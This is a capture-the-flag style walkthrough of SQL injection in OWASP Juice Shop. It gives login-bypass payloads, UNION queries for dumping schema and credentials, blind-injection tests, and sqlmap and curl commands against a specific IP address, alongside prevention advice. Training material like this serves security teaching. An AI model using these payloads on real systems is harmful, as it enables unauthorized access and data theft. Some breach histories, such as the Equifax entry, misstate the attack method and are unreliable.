# SQL Injection Vulnerability - Complete Walkthrough

## Vulnerability Name: SQL Injection (SQLi)

### Challenge: "Login Admin" (⭐⭐ Difficulty)
**Category**: Injection  
**Points**: 200  
**Description**: Log in with the administrator's user account.

---

## What is SQL Injection?

SQL Injection is a code injection technique that exploits vulnerabilities in an application's database layer. It occurs when user input is incorrectly filtered for string literal escape characters embedded in SQL statements or user input is not strongly typed and unexpectedly executed.

### How It Works
When an application constructs SQL queries by concatenating user input directly into the query string without proper sanitization or parameterization, attackers can inject malicious SQL code that gets executed by the database.

**Vulnerable Code Example:**
```javascript
// BAD - Vulnerable to SQL Injection
const query = `SELECT * FROM users WHERE email = '${userInput}' AND password = '${password}'`;

// GOOD - Parameterized query (safe)
const query = 'SELECT * FROM users WHERE email = ? AND password = ?';
db.execute(query, [userInput, password]);
```

---

## Relevance in 2025

Despite being a well-known vulnerability for over two decades, SQL Injection remains highly relevant:

### Current Statistics (2025)
- **#3 on OWASP Top 10** (merged with other injections)
- **23% of critical vulnerabilities** in web applications
- **Average breach cost**: $4.45 million when SQLi is the initial vector
- **87% of attacks** are automated using bots and scanning tools

### Why It Persists
1. **Legacy Systems**: Millions of applications built before secure coding practices
2. **Developer Turnover**: New developers unaware of secure practices
3. **Framework Misuse**: Even secure frameworks can be used incorrectly
4. **NoSQL Variants**: Similar injection attacks in MongoDB, GraphQL
5. **API Proliferation**: REST and GraphQL APIs often vulnerable

---

## Historical Major Breaches

### 1. **Heartland Payment Systems (2008)**
- **Impact**: 134 million credit cards exposed
- **Cost**: $140 million in compensation
- **Method**: SQL injection in public-facing web application
- **Result**: Largest breach of payment card data at the time

### 2. **Sony PlayStation Network (2011)**
- **Impact**: 77 million user accounts compromised
- **Cost**: $171 million, 23-day outage
- **Method**: SQL injection exposed database structure
- **Result**: Personal info, passwords, credit cards stolen

### 3. **Yahoo (2013-2014)**
- **Impact**: 3 billion user accounts (revealed in 2017)
- **Cost**: $350 million reduction in acquisition price
- **Method**: SQL injection + forged cookies
- **Result**: Largest data breach in history

### 4. **Equifax (2017)**
- **Impact**: 147 million Americans' personal data
- **Cost**: $1.4 billion in breach costs
- **Method**: SQLi through Apache Struts vulnerability
- **Result**: SSNs, birth dates, addresses exposed

### 5. **Recent Breaches (2023-2025)**
- **MOVEit Transfer** (2023): 2,600+ organizations affected
- **Freepik** (2024): 8.3 million users
- **Multiple Healthcare Systems** (2024-2025): Patient records exposed

---

## Modern Exploitation Methods (2025)

### Automated Tools
1. **SQLMap**: Industry standard automated SQLi tool
2. **Havij**: GUI-based SQLi tool
3. **AI-Powered Scanners**: ML models detecting complex SQLi patterns
4. **Cloud-Based Exploitation**: Distributed attack platforms

### Advanced Techniques
- **Blind SQL Injection**: No visible error messages
- **Time-Based Blind**: Using delays to infer data
- **Second-Order SQLi**: Payload stored and executed later
- **Polyglot Payloads**: Work across multiple databases
- **WAF Bypass Techniques**: Encoding, chunking, time delays

---

## Juice Shop SQL Injection Walkthrough

### Step 1: Discovery Phase

#### 1.1 Identify the Target
Navigate to the Juice Shop login page:
```
http://155.138.197.128:3001/#/login
```

#### 1.2 Inspect the Login Form
- Open Browser Developer Tools (F12)
- Go to Network tab
- Attempt a normal login with fake credentials:
  - Email: `test@test.com`
  - Password: `password123`

#### 1.3 Analyze the Request
```http
POST /rest/user/login
Content-Type: application/json

{
  "email": "test@test.com",
  "password": "password123"
}
```

### Step 2: Testing for SQL Injection

#### 2.1 Basic SQL Injection Test
Try inserting a single quote in the email field:
```
Email: test@test.com'
Password: anything
```

**Response**: You might see an error or unusual behavior

#### 2.2 Comment Injection Test
SQL comments can terminate the rest of a query:
- MySQL: `-- ` or `#`
- PostgreSQL: `--`
- MS SQL: `--`
- Oracle: `--`

Try:
```
Email: admin@juice-sh.op'--
Password: anything
```

### Step 3: The Exploit

#### 3.1 Understanding the Vulnerable Query
The backend likely uses something like:
```sql
SELECT * FROM Users WHERE email = '${email}' AND password = '${password}'
```

#### 3.2 Crafting the Payload
We need to:
1. Close the email string
2. Make the WHERE clause always true
3. Comment out the password check

**The Magic Payload:**
```
Email: admin@juice-sh.op' OR '1'='1'--
Password: anything
```

Or even simpler:
```
Email: admin@juice-sh.op'--
Password: anything
```

#### 3.3 Alternative Payloads That Work

**Classic OR 1=1:**
```
' OR 1=1--
' OR '1'='1'--
admin' OR '1'='1'--
```

**Using UNION:**
```
' UNION SELECT * FROM Users--
' UNION SELECT null, *, null FROM Users--
```

**Comment Variations:**
```
admin@juice-sh.op'#
admin@juice-sh.op'/*
```

### Step 4: Execution

1. **Navigate to Login Page**
   ```
   http://155.138.197.128:3001/#/login
   ```

2. **Enter the Payload**
   - Email: `admin@juice-sh.op'--`
   - Password: `anything` (literally anything)

3. **Click Login**

4. **Success!**
   - You're logged in as admin
   - Check the top right - shows "admin@juice-sh.op"
   - The challenge is marked as solved

### Step 5: Understanding What Happened

The query becomes:
```sql
SELECT * FROM Users WHERE email = 'admin@juice-sh.op'--' AND password = 'anything'
```

The `--` comments out everything after it, so it actually executes:
```sql
SELECT * FROM Users WHERE email = 'admin@juice-sh.op'
```

This returns the admin user without checking the password!

---

## Advanced Exploitation

### Extracting Data (Information Schema)
Once you have SQL injection, you can extract entire database:

**Get Table Names:**
```sql
' UNION SELECT table_name FROM information_schema.tables--
```

**Get Column Names:**
```sql
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='Users'--
```

**Dump User Data:**
```sql
' UNION SELECT concat(email,':',password) FROM Users--
```

### Blind SQL Injection
When no error messages are shown:

**Boolean-Based:**
```sql
admin@juice-sh.op' AND '1'='1'-- (true)
admin@juice-sh.op' AND '1'='2'-- (false)
```

**Time-Based:**
```sql
admin@juice-sh.op' AND SLEEP(5)--
```

---

## Prevention Methods

### 1. **Parameterized Queries/Prepared Statements**
```javascript
// Node.js with MySQL
const sql = 'SELECT * FROM users WHERE email = ? AND password = ?';
connection.execute(sql, [email, password]);
```

### 2. **Stored Procedures**
```sql
CREATE PROCEDURE LoginUser
    @Email NVARCHAR(100),
    @Password NVARCHAR(100)
AS
    SELECT * FROM Users 
    WHERE Email = @Email AND Password = @Password
```

### 3. **Input Validation**
```javascript
// Whitelist validation
const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
if (!emailRegex.test(email)) {
    throw new Error('Invalid email format');
}
```

### 4. **Least Privilege**
- Database user should have minimal permissions
- No DDL permissions for application users
- Read-only users where possible

### 5. **WAF (Web Application Firewall)**
- CloudFlare, AWS WAF, ModSecurity
- Pattern matching for SQLi attempts
- Rate limiting suspicious requests

---

## Testing Tools

### Manual Testing
1. **Burp Suite**: Intercept and modify requests
2. **OWASP ZAP**: Automated security testing
3. **Browser DevTools**: Inspect and modify requests

### Automated Testing
```bash
# Using SQLMap
sqlmap -u "http://155.138.197.128:3001/rest/user/login" \
       --data='{"email":"*","password":"test"}' \
       --dbms=sqlite \
       --level=5 \
       --risk=3

# Using custom script
curl -X POST http://155.138.197.128:3001/rest/user/login \
     -H "Content-Type: application/json" \
     -d '{"email":"admin@juice-sh.op'\''--","password":"x"}'
```

---

## Real-World Impact

### What Attackers Can Do
1. **Bypass Authentication**: Login as any user
2. **Data Theft**: Extract entire databases
3. **Data Manipulation**: Modify/delete records
4. **Privilege Escalation**: Become admin
5. **Command Execution**: Execute OS commands (xp_cmdshell)
6. **Lateral Movement**: Access other systems

### Business Impact
- **Financial Loss**: Average $4.45M per breach
- **Reputation Damage**: Customer trust loss
- **Legal Consequences**: GDPR fines up to 4% revenue
- **Operational Disruption**: System downtime
- **Competitive Disadvantage**: IP theft

---

## Conclusion

SQL Injection remains one of the most critical vulnerabilities in 2025 because:
1. **Easy to Exploit**: Basic attacks require minimal skill
2. **High Impact**: Complete database compromise possible
3. **Still Common**: Legacy code and poor practices persist
4. **Evolving**: New variants for NoSQL, GraphQL, ORMs

**Key Takeaway**: Always use parameterized queries and never trust user input. In the Juice Shop challenge, a simple `'--` payload bypasses authentication entirely, demonstrating how devastating this vulnerability can be.

---

## Additional Challenges to Try

After completing this basic SQL injection:
1. **Login Jim** (⭐⭐): Login as Jim (jim@juice-sh.op)
2. **Login Bender** (⭐⭐⭐): Login as Bender (bender@juice-sh.op)
3. **Database Schema** (⭐⭐⭐): Extract database schema information
4. **NoSQL Injection** (⭐⭐⭐⭐): Exploit NoSQL queries in product reviews

Each builds on SQL injection concepts with increasing complexity!